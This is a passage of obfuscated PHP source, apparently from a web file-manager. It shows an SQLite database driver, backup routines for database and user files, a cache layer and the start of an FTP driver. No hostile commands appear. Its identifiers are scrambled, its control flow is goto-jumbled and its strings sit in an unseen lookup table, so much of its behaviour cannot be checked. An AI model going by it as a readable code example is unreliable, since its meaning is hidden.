$DêŞÒÖ’Ò[26]; goto bµÆ¥Üˆìå; a‘†²¶: @sqlite_busy_timeout($this->linkID[$fö‰Å¼ÈÀ], 30000); if (1 != think_config($DêŞÒÖ’Ò[28])) { unset($this->config); } goto a–ËÖ®‰ä¬; a–ËÖ®‰ä¬: } return $this->linkID[$fö‰Å¼ÈÀ]; } public function free() { $this->queryID = null; } public function query($aÉÀÉ¿Ê—Ë) { goto AŠ‚¯Å¿Á«; bÇ‹Ê: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Cº‹‘Ù°‰Ô = $this->getAll(); return $Cº‹‘Ù°‰Ô; } goto EŒ‰£¿Ä¼á; FŒÙ½…÷˜ë: $this->queryStr = $aÉÀÉ¿Ê—Ë; if ($this->queryID) { $this->free(); } think_action_status($BéèŞí¨£[29], 1); goto DÁÇÀÏ•Œƒ; DÁÇÀÏ•Œƒ: think_status($BéèŞí¨£[30]); $this->queryID = sqlite_query($this->_linkID, $aÉÀÉ¿Ê—Ë); $this->debug(); goto bÇ‹Ê; AŠ‚¯Å¿Á«: $BéèŞí¨£ =& $_SERVER[£¶ä½¶¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto FŒÙ½…÷˜ë; EŒ‰£¿Ä¼á: } public function execute($a¯à·ÍŸï¤) { goto FË¤À–íï; ağÜ´ÅÅªˆ: think_status($C›“Ï¸ä‰[30]); $dİåÇÃãÉŞ = sqlite_exec($this->_linkID, $a¯à·ÍŸï¤); $this->debug(); goto CòÌ›ÚÃæÉ; DØ¤ïøÔÈæ: $this->queryStr = $a¯à·ÍŸï¤; if ($this->queryID) { $this->free(); } think_action_status($C›“Ï¸ä‰[31], 1); goto ağÜ´ÅÅªˆ; CòÌ›ÚÃæÉ: if (!1 === $dİåÇÃãÉŞ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto D•·¿–ÀÙô; FË¤À–íï: $C›“Ï¸ä‰ =& $_SERVER[£¶ä½¶¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto DØ¤ïøÔÈæ; D•·¿–ÀÙô: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[£¶ä½¶¢][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AÎ­«‹áŠˆ = sqlite_query($this->_linkID, $_SERVER[£¶ä½¶¢][33]); if (!$AÎ­«‹áŠˆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $C‹ØÎÛ·…¶ = sqlite_query($this->_linkID, $_SERVER[£¶ä½¶¢][34]); if (!$C‹ØÎÛ·…¶) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $BŞ›Ó¿Á‚ = array(); if ($this->numRows > 0) { for ($BåÆÆÉºìÅ = 0; $BåÆÆÉºìÅ < $this->numRows; $BåÆÆÉºìÅ++) { $BŞ›Ó¿Á‚[$BåÆÆÉºìÅ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $BŞ›Ó¿Á‚; } public function getFields($cˆÎåÃ‘ŸØ) { $Aá×ÎçÊîò =& $_SERVER[£¶ä½¶¢]; $açîİóİÊ¾ = $this->query($Aá×ÎçÊîò[35] . $cˆÎåÃ‘ŸØ . $Aá×ÎçÊîò[36]); $BÁõŒ³™´å = array(); if ($açîİóİÊ¾) { foreach ($açîİóİÊ¾ as $A—åŸŞ¤‰ => $eĞ¸Š¨‘‘‰) { $BÁõŒ³™´å[$eĞ¸Š¨‘‘‰[$Aá×ÎçÊîò[37]]] = array($Aá×ÎçÊîò[38] => $eĞ¸Š¨‘‘‰[$Aá×ÎçÊîò[37]], $Aá×ÎçÊîò[39] => $eĞ¸Š¨‘‘‰[$Aá×ÎçÊîò[40]], $Aá×ÎçÊîò[41] => (bool) ($eĞ¸Š¨‘‘‰[$Aá×ÎçÊîò[42]] === $Aá×ÎçÊîò[43]), $Aá×ÎçÊîò[44] => $eĞ¸Š¨‘‘‰[$Aá×ÎçÊîò[45]], $Aá×ÎçÊîò[46] => strtolower($eĞ¸Š¨‘‘‰[$Aá×ÎçÊîò[47]]) == $Aá×ÎçÊîò[48], $Aá×ÎçÊîò[49] => strtolower($eĞ¸Š¨‘‘‰[$Aá×ÎçÊîò[50]]) == $Aá×ÎçÊîò[51]); } } return $BÁõŒ³™´å; } public function getTables($EÕ“Öî–»Ã = '') { $eÁù¯â°ÂÒ =& $_SERVER[£¶ä½¶¢]; $B¢šƒ‡‹ö = $this->query($eÁù¯â°ÂÒ[52] . $eÁù¯â°ÂÒ[53] . $eÁù¯â°ÂÒ[54]); $cì¹¨ÑĞ‡ = array(); foreach ($B¢šƒ‡‹ö as $Cğàá„óŒ => $EøÌò˜Æ«˜) { $cì¹¨ÑĞ‡[$Cğàá„óŒ] = current($EøÌò˜Æ«˜); } return $cì¹¨ÑĞ‡; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $bÕÂ¦ÚŠ• =& $_SERVER[£¶ä½¶¢]; $cùœà£öéÅ = sqlite_last_error($this->_linkID); $this->error = $cùœà£öéÅ . $bÕÂ¦ÚŠ•[14] . sqlite_error_string($cùœà£öéÅ); if ($bÕÂ¦ÚŠ•[43] != $this->queryStr) { $this->error .= LNG($bÕÂ¦ÚŠ•[55]) . $this->queryStr; } think_trace($this->error, $bÕÂ¦ÚŠ•[43], $bÕÂ¦ÚŠ•[56]); return $this->error; } public function escapeString($FŞ’Ãç‰™) { return sqlite_escape_string($FŞ’Ãç‰™); } public function parseLimit($Dï¥Ñ¾×¢) { $eé‰Œ»œ¡ =& $_SERVER[£¶ä½¶¢]; $FÄ…Ñ–õ„ë = $eé‰Œ»œ¡[43]; if (!empty($Dï¥Ñ¾×¢)) { $Dï¥Ñ¾×¢ = explode($eé‰Œ»œ¡[57], $Dï¥Ñ¾×¢); if (count($Dï¥Ñ¾×¢) > 1) { $FÄ…Ñ–õ„ë .= $eé‰Œ»œ¡[58] . $Dï¥Ñ¾×¢[1] . $eé‰Œ»œ¡[59] . $Dï¥Ñ¾×¢[0] . $eé‰Œ»œ¡[60]; } else { $FÄ…Ñ–õ„ë .= $eé‰Œ»œ¡[58] . $Dï¥Ñ¾×¢[0] . $eé‰Œ»œ¡[60]; } } return $FÄ…Ñ–õ„ë; } } goto A·«Â”†ù; Eßª™İ: class BackupDbFile { public function __construct() { } public function index() { goto a¯Ğ‹ÓÏØ†; c’à‹õÅñÜ: IO::copy($d„‘Ï‹, $Dóñôõ¬Š); $eÏ¶‹ÏŠ †->end(); $E›÷Ó¾ƒ¡Ò = array($cø¦‹ã¼Š¯[778] => $FÅŠêæª‰, $cø¦‹ã¼Š¯[779] => time()); goto DÑ­ñ¿»Õ; DÑ­ñ¿»Õ: Backup::set($E›÷Ó¾ƒ¡Ò); return !0; goto a¸æâ°ºè; bÁ‹ºéÍ†ù: $eº˜“ËÇ—ª = $this->tmpFilesPath() . "\x62\141\143\153\165\x70\x5f{$Cñ˜ƒøŞºÈ}\x2f"; $Dóñôõ¬Š = $this->backupPath($D·ãÂÖïÛå); if (!($Dóñôõ¬Š = IO::mkdir($Dóñôõ¬Š))) { return !1; } goto cã‹ŞÚ¢ƒ; cã‹ŞÚ¢ƒ: $e‹¢ÛÜ³Â = IO::listPath($eº˜“ËÇ—ª); $fÔÂ¦¹ˆªª = isset($e‹¢ÛÜ³Â[$cø¦‹ã¼Š¯[84]]) ? $e‹¢ÛÜ³Â[$cø¦‹ã¼Š¯[84]] : array(); $FÅŠêæª‰ = array_sum(array_column($fÔÂ¦¹ˆªª, $cø¦‹ã¼Š¯[88])); goto a÷ÖØªÓùÕ; e÷ÛÖŠÄ¾ß: $A«í¶Œ–šá = CONTROLLER_DIR . $cø¦‹ã¼Š¯[776]; $d„‘Ï‹ = CONTROLLER_DIR . $cø¦‹ã¼Š¯[777]; IO::copy($A«í¶Œ–šá, $Dóñôõ¬Š); goto c’à‹õÅñÜ; a…—§“–á¾: $eÏ¶‹ÏŠ † = new TaskFileTransfer($cø¦‹ã¼Š¯[772], $cø¦‹ã¼Š¯[750], count($fÔÂ¦¹ˆªª), LNG($cø¦‹ã¼Š¯[751]) . $cø¦‹ã¼Š¯[448] . LNG($cø¦‹ã¼Š¯[753]) . $cø¦‹ã¼Š¯[773]); $eÏ¶‹ÏŠ †->task[$cø¦‹ã¼Š¯[731]] = $FÅŠêæª‰; foreach ($e‹¢ÛÜ³Â[$cø¦‹ã¼Š¯[84]] as $EŞ ‘„³Šä) { $fæÅ´íùŸŞ = IO::move($EŞ ‘„³Šä[$cø¦‹ã¼Š¯[86]], $Dóñôõ¬Š); if (!$fæÅ´íùŸŞ) { $eÏ¶‹ÏŠ †->end(); $A¥·ğëÑä = IO::getLastError($cø¦‹ã¼Š¯[774] . $EŞ ‘„³Šä[$cø¦‹ã¼Š¯[86]] . $cø¦‹ã¼Š¯[775] . $Dóñôõ¬Š . $cø¦‹ã¼Š¯[512]); write_log($A¥·ğëÑä, $cø¦‹ã¼Š¯[750]); return !1; } } goto e÷ÛÖŠÄ¾ß; a¯Ğ‹ÓÏØ†: $cø¦‹ã¼Š¯ =& $_SERVER[£¶ä½¶¢]; $D·ãÂÖïÛå = Backup::get(); $Cñ˜ƒøŞºÈ = $D·ãÂÖïÛå[$cø¦‹ã¼Š¯[38]]; goto bÁ‹ºéÍ†ù; a÷ÖØªÓùÕ: if (!$FÅŠêæª‰) { return !1; } $E›÷Ó¾ƒ¡Ò = array($cø¦‹ã¼Š¯[770] => $FÅŠêæª‰, $cø¦‹ã¼Š¯[771] => time()); Backup::set($E›÷Ó¾ƒ¡Ò); goto a…—§“–á¾; a¸æâ°ºè: } private function backupPath($C¶ääİœ‚–) { $c†ÇâÁ¡Åª =& $_SERVER[£¶ä½¶¢]; $A‹Åõ–›î = $C¶ääİœ‚–[$c†ÇâÁ¡Åª[38]]; $FØ¸îÌÆö = Model($c†ÇâÁ¡Åª[738])->get($c†ÇâÁ¡Åª[739]); $fƒÙ³ôÛ’ = substr(md5($c†ÇâÁ¡Åª[740] . $FØ¸îÌÆö . $A‹Åõ–›î), 0, 8); return "\173\151\x6f\72{$C¶ääİœ‚–[$c†ÇâÁ¡Åª[720]]}\175\57\x64\141\x74\x61\142\141\x73\x65\57\142\141\143\153\x75\x70\57" . $A‹Åõ–›î . $c†ÇâÁ¡Åª[81] . $fƒÙ³ôÛ’; } private function tmpFilesPath() { $CğÚ†¿ÒÑ  =& $_SERVER[£¶ä½¶¢]; $c‡î¶‰Ú = TEMP_FILES; if ($GLOBALS[$CğÚ†¿ÒÑ [16]][$CğÚ†¿ÒÑ [98]][$CğÚ†¿ÒÑ [768]]) { $c‡î¶‰Ú = $GLOBALS[$CğÚ†¿ÒÑ [16]][$CğÚ†¿ÒÑ [98]][$CğÚ†¿ÒÑ [768]]; if (!mk_dir($c‡î¶‰Ú) || !is_writable($c‡î¶‰Ú) || !IO::mkfile($c‡î¶‰Ú . $CğÚ†¿ÒÑ [769])) { $c‡î¶‰Ú = TEMP_FILES; } } return $c‡î¶‰Ú; } } class BackupFile { public function __construct() { } public function index() { goto Fé©˜‚Ó; b™³£Ì‚ê‰: $b÷½Å„ÂÃ = !0; $Càë÷£ì†ğ = $this->storeIds(); $bÕ„—ù†öğ = 1; goto b‘øæšµ; cà¨××ˆÙ: $F‡§‹òù  = $C­°¿„¡ùé = 0; do { $açôƒ©™’É = $_SERVER[£¶ä½¶¢][787]; $CÇœÀªÁ™ = Model($_SERVER[£¶ä½¶¢][755])->where($F½„½°°ï×)->field($açôƒ©™’É)->order($_SERVER[£¶ä½¶¢][788])->selectPage($f³Ë´‹¿¶, $bÕ„—ù†öğ); $A’Š˜Éì™ = !empty($CÇœÀªÁ™[$_SERVER[£¶ä½¶¢][376]]) ? $CÇœÀªÁ™[$_SERVER[£¶ä½¶¢][376]] : array(); foreach ($A’Š˜Éì™ as $C·»‹ğˆÃÙ) { goto Aí¡«ºíñë; f›‚Š˜·×: $Dì™Åñ–ÉÌ += $C·»‹ğˆÃÙ[$_SERVER[£¶ä½¶¢][88]]; $C­°¿„¡ùé += 1; $F‡§‹òù  += $C·»‹ğˆÃÙ[$_SERVER[£¶ä½¶¢][88]]; goto Eš†ã†µÜ°; Eš†ã†µÜ°: if ($Dì™Åñ–ÉÌ >= 1024 * 1024 * 100) { $BÀ†¦Éô¾µ = array($_SERVER[£¶ä½¶¢][793] => $c¼ç¦ÌğË², $_SERVER[£¶ä½¶¢][794] => $C­°¿„¡ùé, $_SERVER[£¶ä½¶¢][795] => $F‡§‹òù ); Backup::set($BÀ†¦Éô¾µ); $Dì™Åñ–ÉÌ = $EŸä¬²àÍä = 0; } goto cŒ†ìÕŠÛ¯; Eã™†àĞ–: if (IO::exist($FÂÎó‘Î)) { $A…º«ÕÁœÍ->updateFileEnd($C·»‹ğˆÃÙ[$_SERVER[£¶ä½¶¢][38]], $C·»‹ğˆÃÙ[$_SERVER[£¶ä½¶¢][88]]); } else { $FÂÎó‘Î = get_path_father($FÂÎó‘Î); IO::mkdir($FÂÎó‘Î); if (!IO::copy($cùŒèÀÙÆ«, $FÂÎó‘Î, $_SERVER[£¶ä½¶¢][791])) { write_log($_SERVER[£¶ä½¶¢][792] . $cùŒèÀÙÆ« . $_SERVER[£¶ä½¶¢][775] . $FÂÎó‘Î . $_SERVER[£¶ä½¶¢][512], $_SERVER[£¶ä½¶¢][750]); $b÷½Å„ÂÃ = !1; break; } } $c¼ç¦ÌğË² = $C·»‹ğˆÃÙ[$_SERVER[£¶ä½¶¢][455]]; $EŸä¬²àÍä += 1; goto f›‚Š˜·×; Aí¡«ºíñë: if (!$this->_fileExist($C·»‹ğˆÃÙ, $aÃå÷¨µİ, $Càë÷£ì†ğ)) { $CÛÆö‰ªø³ -= 1; $D“§®Ø„„Ü -= (int) $C·»‹ğˆÃÙ[$_SERVER[£¶ä½¶¢][88]]; write_log("\146\151\154\x65\x20\x6e\157\x74\40\x65\170\x69\163\x74\56\x66\x69\x6c\x65\111\x44\72{$C·»‹ğˆÃÙ[$_SERVER[£¶ä½¶¢][455]]}\x2c\x20\x70\x61\x74\150\x3a{$C·»‹ğˆÃÙ[$_SERVER[£¶ä½¶¢][86]]}", $_SERVER[£¶ä½¶¢][789]); continue; } $cùŒèÀÙÆ« = $C·»‹ğˆÃÙ[$_SERVER[£¶ä½¶¢][86]]; $FÂÎó‘Î = "\x7b\151\157\72{$DÔ¾ªºò¨Î[$_SERVER[£¶ä½¶¢][720]]}\175" . substr($cùŒèÀÙÆ«, strlen("\173\x69\157\72{$C·»‹ğˆÃÙ[$_SERVER[£¶ä½¶¢][790]]}\175")); goto Eã™†àĞ–; cŒ†ìÕŠÛ¯: } $c‡¢„à” = count($A’Š˜Éì™); $bÕ„—ù†öğ++; } while ($c‡¢„à” == $f³Ë´‹¿¶); $A…º«ÕÁœÍ->end(); goto a¤¤›¢‡ğ‘; C½ŠëçÓ: $A…º«ÕÁœÍ->task[$_SERVER[£¶ä½¶¢][731]] = $D“§®Ø„„Ü; $BÀ†¦Éô¾µ = array($_SERVER[£¶ä½¶¢][784] => $CÛÆö‰ªø³, $_SERVER[£¶ä½¶¢][785] => $D“§®Ø„„Ü, $_SERVER[£¶ä½¶¢][786] => time()); Backup::set($BÀ†¦Éô¾µ); goto b™³£Ì‚ê‰; Fé©˜‚Ó: $DÔ¾ªºò¨Î = Backup::get(); $c¼ç¦ÌğË² = $DÔ¾ªºò¨Î[$_SERVER[£¶ä½¶¢][300]][$_SERVER[£¶ä½¶¢][203]][$_SERVER[£¶ä½¶¢][455]]; $F½„½°°ï× = array($_SERVER[£¶ä½¶¢][456] => array($_SERVER[£¶ä½¶¢][780], $c¼ç¦ÌğË²), $_SERVER[£¶ä½¶¢][781] => array($_SERVER[£¶ä½¶¢][338], $DÔ¾ªºò¨Î[$_SERVER[£¶ä½¶¢][720]])); goto FİŒ™…‰Î; d¦¼½Ÿí: $this->_fileFilter($aÃå÷¨µİ); return !0; goto D†ˆ¬÷ø†; b‘øæšµ: $f³Ë´‹¿¶ = 1000; $Dì™Åñ–ÉÌ = $EŸä¬²àÍä = 0; $aÃå÷¨µİ = array(); goto cà¨××ˆÙ; a¤¤›¢‡ğ‘: $BÀ†¦Éô¾µ = array($_SERVER[£¶ä½¶¢][796] => 1, $_SERVER[£¶ä½¶¢][484] => time(), $_SERVER[£¶ä½¶¢][743] => 1, $_SERVER[£¶ä½¶¢][793] => $c¼ç¦ÌğË², $_SERVER[£¶ä½¶¢][785] => $D“§®Ø„„Ü, $_SERVER[£¶ä½¶¢][784] => $CÛÆö‰ªø³, $_SERVER[£¶ä½¶¢][797] => time()); if ($EŸä¬²àÍä) { $BÀ†¦Éô¾µ[$_SERVER[£¶ä½¶¢][794]] = $C­°¿„¡ùé; $BÀ†¦Éô¾µ[$_SERVER[£¶ä½¶¢][795]] = $F‡§‹òù ; } Backup::set($BÀ†¦Éô¾µ); goto d¦¼½Ÿí; FİŒ™…‰Î: $CÛÆö‰ªø³ = (int) Model($_SERVER[£¶ä½¶¢][755])->where($F½„½°°ï×)->count($_SERVER[£¶ä½¶¢][455]); $D“§®Ø„„Ü = (int) Model($_SERVER[£¶ä½¶¢][755])->where($F½„½°°ï×)->sum($_SERVER[£¶ä½¶¢][88]); $A…º«ÕÁœÍ = new TaskFileTransfer($_SERVER[£¶ä½¶¢][782], $_SERVER[£¶ä½¶¢][750], $CÛÆö‰ªø³, LNG($_SERVER[£¶ä½¶¢][751]) . $_SERVER[£¶ä½¶¢][752] . LNG($_SERVER[£¶ä½¶¢][783])); goto C½ŠëçÓ; D†ˆ¬÷ø†: } private function _fileExist($D£ùÛô¯–, &$FÃÆ’ØÜ, $B¼¸çìçÛ®) { goto bÏ¸¤Ñ÷; Dä——°ĞĞŸ: if (!in_array($D£ùÛô¯–[$a…Ü¹÷¦šÕ[790]], $B¼¸çìçÛ®)) { return !1; } if (IO::exist($dÌ¤ÎïµŒŠ)) { return !0; } $aÕé­ï½¯ = get_path_father($dÌ¤ÎïµŒŠ); goto bÑº¼Š²»; bÏ¸¤Ñ÷: $a…Ü¹÷¦šÕ =& $_SERVER[£¶ä½¶¢]; $dÌ¤ÎïµŒŠ = $D£ùÛô¯–[$a…Ü¹÷¦šÕ[86]]; if (in_array($D£ùÛô¯–[$a…Ü¹÷¦šÕ[455]], $FÃÆ’ØÜ)) { return !1; } goto Dä——°ĞĞŸ; bÑº¼Š²»: if (IO::exist($aÕé­ï½¯)) { $FÃÆ’ØÜ[] = $D£ùÛô¯–[$a…Ü¹÷¦šÕ[455]]; return !1; } $F‰Æ±®½Âˆ = array($a…Ü¹÷¦šÕ[790] => $D£ùÛô¯–[$a…Ü¹÷¦šÕ[790]], $a…Ü¹÷¦šÕ[86] => array($a…Ü¹÷¦šÕ[388], "{$aÕé­ï½¯}\x25")); $cìŒ—ÎÇÌ = Model($a…Ü¹÷¦šÕ[755])->where($F‰Æ±®½Âˆ)->field($a…Ü¹÷¦šÕ[456])->select(); goto fÖ›­ñ; fÖ›­ñ: $FÃÆ’ØÜ = array_merge($FÃÆ’ØÜ, array_to_keyvalue($cìŒ—ÎÇÌ, $a…Ü¹÷¦šÕ[43], $a…Ü¹÷¦šÕ[455])); return !1; goto Côß»›ˆíÑ; Côß»›ˆíÑ: } private function _fileFilter($DË÷ñåíÖó) { $eè¤îª™Ê­ =& $_SERVER[£¶ä½¶¢]; if (empty($DË÷ñåíÖó)) { return; } $A¦¾ƒÚ–¯Æ = array($eè¤îª™Ê­[455] => array($eè¤îª™Ê­[17], array_unique($DË÷ñåíÖó))); $BÜæ¿›© = Model($eè¤îª™Ê­[798])->where($A¦¾ƒÚ–¯Æ)->field($eè¤îª™Ê­[403])->select(); foreach ($BÜæ¿›© as $dÂä±ÄÙä) { Model($eè¤îª™Ê­[798])->remove($dÂä±ÄÙä[$eè¤îª™Ê­[403]], !1); } } private function storeIds() { $C‰ÕëÙ§‚Ë =& $_SERVER[£¶ä½¶¢]; $AÔÚ¸×Ã˜² = Model($C‰ÕëÙ§‚Ë[735])->listData(); $DÎ³öËƒ„Ö = array(); $cçÃˆÁØ = $GLOBALS[$C‰ÕëÙ§‚Ë[16]][$C‰ÕëÙ§‚Ë[98]][$C‰ÕëÙ§‚Ë[799]]; foreach ($AÔÚ¸×Ã˜² as $e½‰®Ú¼·°) { $Bã¨ùô­‹ = strtolower($e½‰®Ú¼·°[$C‰ÕëÙ§‚Ë[104]]); if (!isset($cçÃˆÁØ[$Bã¨ùô­‹])) { continue; } $Aˆ††è¾‘’ = $C‰ÕëÙ§‚Ë[82] . (isset($cçÃˆÁØ[$Bã¨ùô­‹]) ? $cçÃˆÁØ[$Bã¨ùô­‹] : ucfirst($Bã¨ùô­‹)); if (!class_exists($Aˆ††è¾‘’)) { continue; } $DÎ³öËƒ„Ö[] = $e½‰®Ú¼·°[$C‰ÕëÙ§‚Ë[401]]; } return $DÎ³öËƒ„Ö; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto d¼Ç¶Š†ğÛ; d¼Ç¶Š†ğÛ: $añ™ ÛºÜÄ =& $_SERVER[£¶ä½¶¢]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto aÜ–½’ˆóÃ; aÜ–½’ˆóÃ: $A²¥ö²à‹ = $GLOBALS[$añ™ ÛºÜÄ[16]][$añ™ ÛºÜÄ[356]]; $B©äƒÎ§§ = $A²¥ö²à‹[$A²¥ö²à‹[$añ™ ÛºÜÄ[800]]]; $dÀã±‰‘•• = $A²¥ö²à‹[$añ™ ÛºÜÄ[801]]; goto DåØ¶ÔĞ; DåØ¶ÔĞ: switch ($A²¥ö²à‹[$añ™ ÛºÜÄ[800]]) { case $añ™ ÛºÜÄ[27]: self::$handle = Model($añ™ ÛºÜÄ[802]); break; case $añ™ ÛºÜÄ[803]: self::$handle = new CacheRedis($B©äƒÎ§§, $dÀã±‰‘••); break; case $añ™ ÛºÜÄ[804]: self::$handle = new CacheMemcached($B©äƒÎ§§, $dÀã±‰‘••); break; case $añ™ ÛºÜÄ[203]: self::$handle = new CacheFile($B©äƒÎ§§, $dÀã±‰‘••); break; default: break; } return self::$handle; goto BÆ…àè¯µ•; BÆ…àè¯µ•: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($cŒ¶œ×Ü š) { if (is_array($cŒ¶œ×Ü š) || is_object($cŒ¶œ×Ü š)) { $cŒ¶œ×Ü š = json_encode($cŒ¶œ×Ü š); } $cŒ¶œ×Ü š = rawurlencode($cŒ¶œ×Ü š); return md5(KOD_SITE_ID . $_SERVER[£¶ä½¶¢][81] . $cŒ¶œ×Ü š); } public static function get($CøÚÎÈéˆ, $fÎù²‘®¤Ä = false) { $EŒ«‚¨ = self::key($CøÚÎÈéˆ); if ($fÎù²‘®¤Ä) { return unserialize(self::init()->get($EŒ«‚¨)); } if (!isset(self::$memoryCache[$EŒ«‚¨])) { $aó¤ïØí¢ = self::init()->get($EŒ«‚¨); self::$memoryCache[$EŒ«‚¨] = unserialize($aó¤ïØí¢); } return self::$memoryCache[$EŒ«‚¨]; } public static function set($B…Ë‰ù†‡, $A¡åË¤î¡, $Aª‰•…áÌÇ = false) { goto BŞãòîØÑ; aä‘ãÛ­¦: CacheLock::lock($B…Ë‰ù†‡); $D¶¥¿ğŒäì = self::init()->set($bÔÃ¡÷…, serialize($A¡åË¤î¡), $Aª‰•…áÌÇ); self::$memoryCache[$bÔÃ¡÷…] = $A¡åË¤î¡; goto cí‰ôÅÌ¬È; cí‰ôÅÌ¬È: CacheLock::unlock($B…Ë‰ù†‡); return $D¶¥¿ğŒäì; goto AŒàáÖ‚Ê‘; BŞãòîØÑ: $bÔÃ¡÷… = self::key($B…Ë‰ù†‡); if (isset(self::$memoryCache[$bÔÃ¡÷…]) && self::$memoryCache[$bÔÃ¡÷…] === $A¡åË¤î¡) { return !0; } if ($Aª‰•…áÌÇ === 0) { self::$memoryCache[$bÔÃ¡÷…] = $A¡åË¤î¡; return !0; } goto aä‘ãÛ­¦; AŒàáÖ‚Ê‘: } public static function getCall($C‹ÛÂŠ›°£, $C…è—ºÇô—, $EÔˆÔÑŞ‘Š, $DÜŠô÷¿Â“ = array()) { goto b¿âË÷´ãõ; F‰²«’«ô¢: return $BƒŞµ»£ÎÄ; goto cî‹õ¶¶ïÊ; b¿âË÷´ãõ: $Aœ·èäƒÀ =& $_SERVER[£¶ä½¶¢]; $BƒŞµ»£ÎÄ = self::get($C‹ÛÂŠ›°£); if ($BƒŞµ»£ÎÄ || $BƒŞµ»£ÎÄ === $Aœ·èäƒÀ[43]) { return $BƒŞµ»£ÎÄ; } goto c¥ÁŞµÀ„µ; c¥ÁŞµÀ„µ: $BƒŞµ»£ÎÄ = call_user_func_array($EÔˆÔÑŞ‘Š, $DÜŠô÷¿Â“); $BƒŞµ»£ÎÄ = $BƒŞµ»£ÎÄ ? $BƒŞµ»£ÎÄ : $Aœ·èäƒÀ[43]; self::set($C‹ÛÂŠ›°£, $BƒŞµ»£ÎÄ, $C…è—ºÇô—); goto F‰²«’«ô¢; cî‹õ¶¶ïÊ: } public static function remove($E¶ŒíÆÍ‹) { goto CÈäòåÆ”¾; EŠçùÎ¬Şº: CacheLock::lock($E¶ŒíÆÍ‹); $dÀªšÔ½Í“ = self::init()->remove($Bª‘†°™ù°); CacheLock::unlock($E¶ŒíÆÍ‹); goto F—¬âÆí‹ù; F—¬âÆí‹ù: return $dÀªšÔ½Í“; goto Eé±šÏÓ»¬; CÈäòåÆ”¾: $Bª‘†°™ù° = self::key($E¶ŒíÆÍ‹); unset(self::$memoryCache[$Bª‘†°™ù°]); self::clearTimeout(); goto EŠçùÎ¬Şº; Eé±šÏÓ»¬: } public static function removeMemory($Eì—óø´Ì) { $aŒ‹îæ­¾ = self::key($Eì—óø´Ì); unset(self::$memoryCache[$aŒ‹îæ­¾]); } public static function clearMemory($D½¥‚Ô²µ = false) { if ($D½¥‚Ô²µ) { $D½¥‚Ô²µ = self::key($D½¥‚Ô²µ); unset(self::$memoryCache[$D½¥‚Ô²µ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[£¶ä½¶¢][805])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[£¶ä½¶¢][806])) { self::init()->clearTimeout(); } } } goto b•‘¤¶Á“; cˆ¶®œËÇë: define($_SERVER[£¶ä½¶¢][245], 1); define($_SERVER[£¶ä½¶¢][246], 2); define($_SERVER[£¶ä½¶¢][247], 3); goto d‡¨Ñ¥ÇÅ¾; föØôÄöƒ‰: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($e„ÛÍŞ­Ö) { parent::__construct(); if (count($e„ÛÍŞ­Ö) > 0) { $this->_init($e„ÛÍŞ­Ö); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($dáÈ æ¤Ò») { $DƒÄëÅ¼§ =& $_SERVER[£¶ä½¶¢]; global $config; $this->appCharset = $config[$DƒÄëÅ¼§[1239]]; $this->systemCharset = $config[$DƒÄëÅ¼§[1240]]; if (isset($dáÈ æ¤Ò»[$DƒÄëÅ¼§[1241]]) && $dáÈ æ¤Ò»[$DƒÄëÅ¼§[1241]]) { $this->systemCharset = $dáÈ æ¤Ò»[$DƒÄëÅ¼§[1241]]; } } public function iconvApp($eí±É‹ŠîÜ) { return $this->iconvTo($eí±É‹ŠîÜ, $this->systemCharset, $this->appCharset); } public function iconvSystem($CÊ¨­¾¹Ô¿) { return $this->iconvTo($CÊ¨­¾¹Ô¿, $this->appCharset, $this->systemCharset); } public function getPathOuter($aƒÒÂ‹‚‰) { goto b„ë‚Ã²â; b„ë‚Ã²â: $Fæ²ÃÌœ‘ =& $_SERVER[£¶ä½¶¢]; $cßÇÕÕ±ÄÑ = $this->iconvApp($this->pathBase); $aƒÒÂ‹‚‰ = $this->iconvApp($aƒÒÂ‹‚‰); goto bÜÁ“´µµĞ; bÜÁ“´µµĞ: if (substr($cßÇÕÕ±ÄÑ, 0, 2) == $Fæ²ÃÌœ‘[1242]) { $cßÇÕÕ±ÄÑ = BASIC_PATH . substr($cßÇÕÕ±ÄÑ, 2); } if (substr($aƒÒÂ‹‚‰, 0, 2) == $Fæ²ÃÌœ‘[1242]) { $aƒÒÂ‹‚‰ = BASIC_PATH . substr($aƒÒÂ‹‚‰, 2); } $cßÇÕÕ±ÄÑ = KodIO::clear($cßÇÕÕ±ÄÑ); goto Bß¾Ö°ˆœ; a¶ò‡îï°ù: return $this->pathDriver . $Fæ²ÃÌœ‘[18] . ltrim($aƒÒÂ‹‚‰, $Fæ²ÃÌœ‘[18]); goto EŠŠŒç÷Àõ; Bß¾Ö°ˆœ: $aƒÒÂ‹‚‰ = KodIO::clear($aƒÒÂ‹‚‰); $aƒÒÂ‹‚‰ = substr($aƒÒÂ‹‚‰, strlen($cßÇÕÕ±ÄÑ)); if (empty($this->pathDriver)) { return $aƒÒÂ‹‚‰; } goto a¶ò‡îï°ù; EŠŠŒç÷Àõ: } private function _init($d¦ºªÎÛ±§ = array()) { $dŠ…â±Ë„ä =& $_SERVER[£¶ä½¶¢]; if (!function_exists($dŠ…â±Ë„ä[1243])) { throw new 